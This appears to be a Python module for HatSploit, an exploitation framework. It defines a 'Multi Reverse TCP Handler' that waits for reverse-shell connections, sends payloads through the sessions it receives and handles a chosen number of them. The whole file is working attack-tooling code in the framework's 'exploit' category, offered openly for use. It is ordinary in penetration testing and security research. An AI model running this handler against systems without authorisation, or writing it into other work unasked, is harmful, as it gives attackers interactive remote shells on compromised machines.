"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from hatsploit.lib.payloads import Payloads


class HatSploitModule(Module, Handler):
    def __init__(self):
        super().__init__()

        self.payloads = Payloads()

        self.details = {
            'Category': "exploit",
            'Name': "Multi Reverse TCP Handler",
            'Module': "exploit/generic/handler/multi_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Multi Reverse TCP Handler.",
            'Platform': "generic",
            'Rank': "high",
        }

        self.payload = {
            'Value': None,
            'Architectures': None,
            'Platforms': None,
            'Action': "shell",
            'Types': None,
            'Handler': 'reverse_tcp',
        }

        self.options = {
            'SESSIONS': {
                'Description': "Number of sessions to open.",
                'Value': 1,
                'Type': "integer",
                'Required': True,
            }
        }

    def run(self):
        sessions = self.parse_options(self.options)

        remote = self.module_handle_session(
            module=self,
            type=self.payload['Handler']
        )

        if remote:
            for i in range(int(sessions)):
                if i == int(sessions) - 1:
                    self.module_handle(
                        module=self,
                        sender=remote[0].send_command,
                        on_session=remote[0].close
                    )
                else:
                    self.module_handle(
                        module=self,
                        sender=remote[0].send_command
                    )
